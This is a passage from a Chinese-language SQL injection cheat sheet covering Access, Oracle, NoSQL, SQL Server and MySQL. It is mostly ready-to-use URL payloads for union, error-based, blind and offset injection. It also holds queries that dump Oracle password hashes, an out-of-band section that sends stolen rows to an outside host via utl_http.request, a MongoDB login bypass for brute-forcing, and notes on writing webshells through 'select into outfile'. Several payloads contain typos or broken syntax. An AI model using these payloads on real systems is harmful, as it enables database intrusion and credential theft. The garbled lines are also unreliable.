MID(str,start,length) 	# 可以用来提取母字符串中一部分特定的子字符串。
ASC() 	# 可以返回参数中字符对应的ASCII值
IIF(condition,true,false)
top 1	# limit函数的替代
# 判断数据库类型
# 返回正常为Access数据库
?id=1 and exists(select * from msysobjects)>0
# 返回正常位MySQL数据库
?id=1 and exists(select * from sysobject)>0
# 使用 exists 采解表名和列名
# 联合查询时, 结尾必须加上 from 表或列名
?id=1 union 1,2, select 4,5,6 from 表或列名
# 判断注入
?id=1' 	# 出错
?id=1" 	# 出错
?id=1 	# 未出错
?id=5-1 	# 未出错,注入类型为数字型
# 猜表名, 把 from后面 * 加进变量, 使用 burp 跑
?id=1 and exists(select count(*) from *)
# 判断字段数和显示位
?id=1 order by 5
?id=1 union select 1,2,3,4,5 from user
# 查数据
?id=1 union select 1,username,password,4,5,6,7,8,9,10,11 from user
# 查表和字段内容,数据类型要保持一致,所以ID无法查询,where后 top不能从0开始
?id=1 union select top 1 1,username,password,4,5,6,7,8,9,10,11 from user where username not in (select top 1 username from user)
```

### **Access_布尔盲注**

```
# 判断注入
?id=1 and 1=1 或 and 1=0
# 查看第 1 行,第 1 个字母
?id=1 and (select top 1 asc(mid(username,1,1)) from user)>97
# 查看第 2 行,第 1 个字母
?id=1 and (select top 1 asc(mid(username,1,1)) from user where id not in (select top 1 id from user))>97
```

### **Access_偏移注入**

```
/**借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。
成功与否看技巧与运气，不能保证100%成功，无需管理员账号密码字段，直接爆账号密码，很大程度上解决猜不到字段的问题。
偏移注入的利用条件：

已知管理表名
已知任意字段（一个或多个会增加机率，最常见的就是id）
成功率的因素

管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）
当前注入点的脚本内查询的表内的字段数越多越好（最好有几十个，这样基本成功率是100%）
已知的字段数越多越好（id一般存在**/
#第一步:使用之前的方法得到显示点为2,3，字段个数为7，但是我们并不知道列名
?id=1 union select 1,2,3,4,5,6,7 from user
#第二步:用*依次向前替换数字字段，直到页面显示正常。例如在5替换为*后页面返回正常
?id=1 union select 1,2,3,4,* from user
#说明星号替换了3个字段(也就是表中有三个字段),后续要使用inner jion自表连接查询，因此计算字
段数乘以2是否小于当前列(3*2<7)
#第三步:公式成立的话，用inner jion自连接查询
?id=1 union select 1,* from (user as a inner join user as b on a.id=b.id)
#如果是更多位，可再接inner join
?id=1 union select 1,* from ((user as a inner join user as b on a.id=b.id) inner join user as c a.id=c.id)
```

## Oracle

### **Oracle_基础操作**

|    类型     |      含义      |                           存储描述                           |
| :---------: | :------------: | :----------------------------------------------------------: |
|   Char()    |     字串型     |                最大长度2000, 不足时用空格补充                |
| Carchar2()  |     字串型     |           最大长度4000, 实际长度由存储数据长度绝定           |
| Number(x,y) |     数字型     | 浮点型, 整型, 都可以存储, x 表示最大位数, y 表示小数位的最大位数 |
|    Date     | 日期(日-月-年) |                         存储时间类型                         |
|    Clob     |    字符数据    |       存储较大的文本, 比如非结构话的XML文档, 最大位4G        |
|    Blob     |   二进制数据   |               存储二进制对象,图像,音频,视频等                |
|    long     |   超上字符串   |                 存储较长字符串,最大长度为2G                  |

| 数据库基本操作 |                                                              |
| :------------: | :----------------------------------------------------------- |
|     创建表     | creata table 表名(字段名 类型 约束)                          |
|                | creata table test (name char(10) primary key.age tinyint)    |
|    增加字段    | alter table 表名 add(字段名称, 数据类型)                     |
|                | alter table test add(clss_name varchar2(200))                |
|    删除一列    | alter table 表名 set unused column 列名                      |
|                | alter table test set unused column class_name                |
| 修改字段与类型 | alter table 表名 modify(字段名, 新字段类型)                  |
|                | alter table test modify(name varchar(200))                   |
|    插入数据    | insert into 表名 values(所有字段对应的值);                   |
|                | insert into test values(字段名1,字段名2) values('a', 18)     |
|    更新数据    | update 表名 set 字段名 = 值 where 更新条件                   |
|                | update test set age = 20 where name = 'a'                    |
|    删除数据    | delete 表名 where 条件                                       |
|                | delete test where name = 'a'                                 |
|    Truncate    | truncate table 表名        # 将表中数据一次性删除            |
|                | truncate删除速度快且不能恢复, delete删除数据可以在日志中恢复 |

|           数据库            |                                                              |
| :-------------------------: | ------------------------------------------------------------ |
|         dba_tables          | 系统里所有的表的信息,需要DBA权限才能查看                     |
|         all_tables          | 当前用户有权限的表的信息                                     |
|         user_tables         | 当前用户名下的表的信息                                       |
|                             | dba_tables >= all_tables >= user_tables                      |
|       dba_all_tables        | 用户所拥有的或有访问权限的对象和表                           |
|       all_all_tables        | 某一个用户所拥有的或有访问权限的对象和表                     |
|       user_all_tables       | 某一个用户所拥有的对象和表                                   |
|      utl_http.request       | 查看服务器出口 IP                                            |
| utl_inaddr.get_host_address | 查看服务器监听 IP                                            |
|          v$logfile          | 查看服务器操作系统                                           |
|            dual             | 数据库的一个空表, 所有用户都可以使用                         |
|            like             | 模糊查询            # like 'a%'                              |
|            \|\|             | 连接字串符合    #                                            |
|         rownum = 1          | 类似于MySql里面的 limit 1,1                                  |
|          distinct           | 去重                                                         |
|           length            | 计算字串长度                                                 |
|            count            | 计算数量                                                     |
|         where exist         | 判断条件是否正常执行                                         |
|       sys.all.tables        | 所有库表所在                                                 |
|       user_tab_colums       | 所有字段所在                                                 |
|            owner            | 库名字段                                                     |
|         table_name          | 表名字段                                                     |
|        查看服务器sid        | select instance_name from v$instance                         |
|        当前连接用户         | select sys_context ('userenv', 'current_user') from dual     |
|          当前用户           | select user from dual;                                       |
|        列出所有用户         | select username from  all_users order by username;           |
|         列出数据库          | select distinct owner from all_tables;                       |
|          列出表名           | select table_name from all_tables;                           |
|           所有列            | select column_name from all_tab_columns where table_name = 'admin/表名' |
|          定位文件           | select name from v$datafile;                                 |
|                             |                                                              |
|                             |                                                              |

```
# 列出密码哈希:
SELECT name, password, astatus FROM sys.user$ — priv; <= 10g(astatus能够在acct被锁定的状态下给你反馈) SELECT name,spare4 FROM sys.user$ — priv; 11g
# 获取数据库所有用户:
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; -- priv;
# 获取当前用户权限
SELECT * FROM session_privs; 
# 获取所有用户权限
SELECT * FROM dba_sys_privs -- priv;  
# 获取用户角色
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
SELECT DISTINCT grantee FROM dba_sys_privs;
# 获取所有数据库用户密码
SELECT name, password, astatus FROM sys.user$; -- priv, <= 10g;
SELECT name, spare4 FROM sys.user$; -- priv, >= 11g; 
# 列出DBA账户:
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv;
# 获取主机名和IP
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual;  查IP
SELECT UTL_INADDR.get_host_name(‘127.0.0.1’) FROM dual;  查主机名称
```



### **Oracle_联合查询**

```Oracle
# 判断注入类型
?id=1'"\ 或 and 1=0, and 1=1
# 判断字段数
?id=1 order by 4 
# 判断显示位, 和MySQL不同, Oracle判断显示位时需要使用 null, 而且最后必须跟上 from dual 
?id=1 union select null, null, null, null from dual
# 判断显示位类型
?id=1 union select 1,'a',3,4 from dual
# 查看当前数据库 实例 
?id=1 union select 1, (select instance_name),3,4 from dual --
# 查看数据库版本
?id=1 union select 1,banner,3,4 from v$version where rownum = 1
# 查看当前连接的用户
?id=1 union select 1,user,3,4 from dual where rownum = 1
# 查看所有数据库 limit = 1 数字变换, 查看下一个数据库名
?id=1  union select 1,(select owner from (select owner.rownum as limit from (select distinct(owner) from sys.all_tables)) where limit = 1),3,4 from dual
# 查看指定库表
?id=1 union select 1,table_name,3,4 from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1
# 查看字段
?id=1 union select 1,column_name,3,4 from (select column_name,rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1
# 查看数据
?id=1 union select 1,"字段1"||%27~%27||"字段2",3,4 from 库名.表名
# 第二种写法 查看所有数据
?id=1 union select 1,data,3,4 from (select
data,rownum as limit from (select "字段1"||%27~%27||"字段2"||%27~%27||"字段3"||%27~%27||"字段4" as data from 库名.表名)) where limit = 1
```

### **Oracle_报错注入**

```
# 一共有 7 个报错函数
# 1. 查看当前连接的用户
?id=1 and (select dbms_xdb_version.checkin(sys_context('userenv','current_user')) from dual) in not null
# 2. 查看主机名
?id=1 and utl_ianddr.get_host_name(sys_context('userenv', current_user)) = 1
# 3.
?id=1 and ctxsys.drithsx.sn(sys_context('userenv', 'current_user')) = 1
# 4.
?id=1 and ordsys.ord_dicom.getmappingxpath(sys_context('userenv', current_user)) = 1
# 5.
?id=1 and (select dbms_xdb_version.uncheckout(sys_context('userenv', current_user)) from dual) is not null
# 6.
?id=1 and (select dams_xdb_version.makeversioned(sys_context('userenv', 'current_user')) from dual) is not null
# 7.
?id=1 and (select dbms_utility.sqlid_to_sqlhash(sys_context('userenv', 'current_user')) from dual) is not null

# 爆库
?id=1 and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from all_table)) where limit = 1)) from dual) is not null
# 爆表
?id=1 and (select dbms_xdb_version.checkin((select owner from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1)) from dual) is not null
# 爆字段
?id=1 and (select dbms_xdb_version.checkin((select column_name, rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1) from dual) is not null
# 爆数据
?id=1 and (select dbms_xdb_version.checkin((select data from (select datam rownum as limit from (select "字段1"||%27~%27||"字段2" as data from 库名.表名)) where limit = 1)) from dual) is not null
```

### **Oracle_布尔盲注**

```
# 判断注入
?id=1 and 0>6 或 0<6
# 判断数据库数量
?id=1 and (select count(distinct(owner)) from all_tables) = 10
# 判断第 1 个 库的库名长度
?id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5
# 判断第 1 个 库的库名的第一个字母
?id=1 and (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 100
# 判断指定库中,表的数量
?id=1 and (select count(table_name) from all_tables where owner = '库名') = 5
# 判断指定库中, 第 1 个表的长度
?id=1 and (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit =1) = 4
# 判断指定库中, 第 1 个表的第 1 个字母
?id=1 and (select ascii(substr(table_name,1,1)) from (select table_name, rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 100
```

### **Oracle_时间盲注**

```
# 时间盲注的函数区别于其他数据库, 由 case when then else end 组成
# 睡觉函数: dbms_pipe.receive_message(1,3)
# 语法: (case when (payload) then dbms_pipe.receive_message(1,3) else 1 end)
# 判断注入, 是否睡眠 3 秒
?id=1 and 1=1 dbms_pipe.receive_message(1, 3)
# 判断数据库数量
?id=1 and (case when (select count(distinct(owner)) from all_tables) > 10 then dbms_pipeive_message(1, 3) else 1 end) = 1
# 判断第一个数据的库名长度
?id=1 and (case when (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5 then dbms_pipeive_message(1, 3)else 1 end) = 1
# 判断第 1 个数据库名的第 1 个字母
?id=1 and (case when (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=84 then dbms_pipe.receive_message(1,3) else 1 end) = 1

# 判断指定库中第 1 个表的长度
?id=1 and (case when (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 4 then
dbms_pipe.receive_message(1, 3) else 1 end) = 1
# 判断指定库中第 1 个表的第 1 个字母
id=1 and (case when (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1 ) = 68 then dbms_pipe.receive_message(1, 3) else 1 end) = 1
```

### **Oracle_数据外带**

```
# 相关函数
utl_http.request() 
utl_inaddr.get_host_address()	
sys.dbm_ldap.init() 	# 需要在自己电脑上开启http协议
# 示例:
?id=1 and (select utl_http.request('http://oracle.dns域名/data=||拼接payload') from dual) is not null
# 示例:
?id=1 and (select utl_http.request('http://oracle.dns域名/?data='||sys_context('userenv','currrent_user')) from dual ) in not null
#
?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables))where limit = 1)) from dual
#
?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||data from (select data,rownum as limit from (select id||chr(126)||name||chr(126)|| sex as data from 库名.表名)) where limit = 1)) from dual


```







## NoSQL

```mongo
# Not Only SQL 泛指非关系型数据库
​		redis	# key = value 方式存储
​		mongodb	半nosql	半sql	# {'key: value', 'key: value'} join方式存储
​		HBase
​		apache Cassandra

# key = value  以键值对的方式存储数据
# img = {author: '', 'url': '', ......, type: img} 	查询数据的速度较快
# mongodb 未授权, 不需要帐号密码直接登录的漏洞
# 基本操作
# 登录
mongo --host 127.0.0.1
show dbs 	# 查看所有数据库
use	数据库名 	# 切换数据库, 数据库不存在会自动创建
show collections 	# 查看集合
db.dropDatabase()	# 进入数据库后,如果没有选择任何数据库,会删除默认的test数据库
# 集合
show collections 	# 查看集合
db.creataCollection('xx') 	# 创建集合
db.xxx.drop() 	# 删除集合
# 文档操作
da.xx.insert({key:value}) 	# 增加数据
db.xx.remove({删除的条件}) 	# 条件为空,全部删除
db.xx.remove({age:10}) 		# 删除所有符合条件的数据
db.xx.remove({gender.true},{justOne.true}) 	# 只删除符合条件的第一个数据
db.xx.update({查找的条件},{修改的内容}) 	# 更新数据
db.xx.update({查找的条件},{$set{修改的内容}}) 	# 添加数据
# 文档查询
db.xx.find({查询条件}) 	# 为空,查询所有数据
db.xx.find({age:10}) 	# 查询指定条件的所有内容
db.xx.findOne({age:10}) 	# 查询指定条件的第一条
db.xx.find({age:10}).pretty() 	# 格式化输出

# 爆破
# burp锁定POST参数 帐号admin为永真,密码用正则,简单清单跑出密码为123456,
logname[$ne]=admin&logpass[$regex]=e
```

| $regex	# 正则   | $ne 	# 不等于 != | $not 	 # 反匹配 |
| ------------------ | ------------------- | ------------------ |
| $nin 	 # not in | $in 	# in        | $or 	#  or      |
| $it		# <     | $gt 	# >         | $ite	 # <=      |
| $gte 	 # >=     | $all 	# all      |                    |

---

### **区别信息**

国内网站ASP+Access或SQLServer占70%以上，PHP+MySQL占20%。

一般asp+access组合比较多，aspx+mssql(SQL Server)组合比较多

一.数据库查询关键词
查询中用到的关键词主要包含六个，并且他们的顺序依次为selcet--from--where--group by--having--order by

其中select和from是必须的，其他关键词是可选的，这六个关键词的执行顺序与sql语句的书写顺序并不是一样的，而是按照下面的顺序来执行

from--where--group by--having--select--order by

from：需要从哪个数据表检索数据

where：过滤表中数据的条件

group by：如何将上面过滤出的数据分组

having：对上面已经分组的数据进行过滤的条件

select：查看结果集中的那个列，或列的结果

order by：按照什么样的顺序来查看返回的数据

 

常用数据库
常见的数据库有Oracle、MySQL、SQL Server（MSsql）、Access、mongodb等

关系型数据库通过外键关联来建立表与表之间的关系，非关系数据库通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。

 

基于特定函数，判断数据库类型
（1）  len()和length()
在mssql和mysql以及db2内，返回长度值调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。

当你使用and len('a')=1的时候，返回正常页面时，可以推断当前数据库类型可能是mssql,或mysql或是db2,反之可能会是orcale和informix.

（2）  @@version和version()
在mysql内，可以用@@version或是version()来返回当前的版本信息。但是无法判断mysql还是mssql时，可以用version()函数来构造判断。

version()>1的返回与@@version>1相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。

（3）   substring()和substr()
在mssql中可以调用substring()。oracle则只可以调用substr()。

（4）   length()   lengthb()  char_length()
1、Oracle： length(): 表示字符串长度 ； lengthb()：表示字符串的字节长度

2、mysql： length()：返回字符串所占的字节数； char_length()：返回字符串的字符数

基于其他方式，判断数据库类型
(1)  注释符判断

--是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为是这两种数据库类型之一

;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle

 

(2)   特定语句

注意：Access只有一个数据库，直接猜解表名即可

and ( select count(*) from sys.usr_tables) > 0 oracle数据库

and (select count(*) from msysobjects) > 0 -返回权限不足为access数据库

and (select count(*)from MSysAccessObjects)>0 返回正确为access 数据库

and (select count(*)from sysobjects)>0 返回正常说明是 mssql 数据库

and length(user())>10 返回正常说明是 Mysql

Oracle 可以根据 from dual 虚拟库判断

 

（3） 判断注入点

数字型：id=2-1

字符型： ’ 、’)、 '))、 "、 ")、 "))

注释符：-- （--空格）、–+、/**/、#

通过观察页面是否正常，判断页面是否存在注入点

如 id=21’ and 1=1 %23 页面正常

id=21’ and 1=2 %23 页面返回无数据

 

MySQL 与 MSSQL 及 ACCESS 之间的区别

(1)MySQL5.0 以下没有 information_schema 这个默认数据库

(2)ACCESS 没有库名，只有表和字段，并且注入时，后面必须跟表名，因此只能爆表，ACCESS

举例：select 1,2,3 from table_name union select 1,2,3 from table_name

(3)MySQL 使用 limit 排序，ACCESS 使用 TOP 排序（TOP 在 MSSQL 也可使用）

 

各数据库标志性信息
sql server: select @@version --

Oracle : select banner from v$version

mysql ：select @@version, version() --

postgresql: select version() --

 

各数据库特有的函数
sql server: @@pack_received @@rowcount

mysql: connection_id() last_insert_id() row_count()

oracle: bitand(1,1)

postgresql: select extract( dow from row())

 

对于字符串处理方式
sql server: id=1 and 'a'+'b'='ab' --

mssql: id=1 and 'a' + 'b' = 'ab'

mysql: id= 1 and 'a'+'b'='ab' ,'ab'=concat('a' , 'b')

oracle: id=1 and 'a'+'b' = 'a' || 'b' , 'ab'=concat('a' , 'b')

postgresql: id=1 and 'a' + 'b' = 'a' || 'b', 'ab' = concat('a' , 'b')

特殊符号，注释的判断

1、"null" 和 "%00" 是Access支持的注释

2、";" 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。

 

(SQL Server) MSsql服务、端口、后缀
端口：1433

后缀：cracer.mdf

日志文件后缀：cracer_log.ldf

mssql数据库权限

sa权限：数据库操作，文件管理，命令执行，注册表读取等system

db权限：文件管理，数据库操作等users-administrators

public权限：数据库操作guest-users

SQL Server有一些系统变量，如果服务器IIS提示没关闭，并且SQL Server返回错误提示的话，那可以直接从出错信息的获取，方法如下：

？id=49 and user>0

这句语句很简单，但却包含了SQL Server特有注入方法的精髓，我自己也是在一次无意的测试中发现这种效率极高的猜解方法。

先看看含义，前面语句正常，重点在and user>0, user是SQL Server的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQL Server的出错提示是：将nvarchar值"abc"转换数据类型为int的列时发生语法错误，abc正是变量user的值，这样，就拿到了数据库的用户名。

常用测试语句：

 and exists(select* from sysobjects)       //判断数据库是否为SQLServer
 and exists(select * from tableName)       //判断某表是否存在..tableName为表名
 and 1=(select @@VERSION)                  //SQLServer版本
 and 1=(select db_name())                  //当前数据库名
 and 1=(select @@servername)               //本地服务名
 and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员
 and 1=(select IS_MEMBER('db_owner'))       //判断是否是库权限
 and 1=(select HAS_DBACCESS('master'))      //判断是否有库读取权限
 and 1=(select count(*) from master.dbo.sysobjects where xtype ='X' and name='xp_cmdshell')   //判断XP_CMDSHELL是否存在

常识：

Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。

SQL Server中，中文的ASCII为正数，由于UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode()返回unicode值，再用nchar函数取得对应的中文字符。

 

Mysql注入
mysql数据库在渗透过程中能够使用的功能还是比较多的，除了读取数据之外，还可以进行对文件进行读写（前提是权限足够）。

读取前提：

1.用户权限足够高，尽量具有root权限。

2.secure_file_priv不为NULL。

3.获取web目录的物理路径。

 Mysql用secure_file_priv这个配置项来完成对数据导入导出的限制。如果secure_file_priv=NULL，Mysql服务会禁止导入和导出操作。通过命令查看secure_file_priv的当前值，确认是否允许导入导出以及导出文件路径。
 show variables like '%secure_file_priv';

 MySQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有file权限就可以执行select into outfile操作。

 当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到。

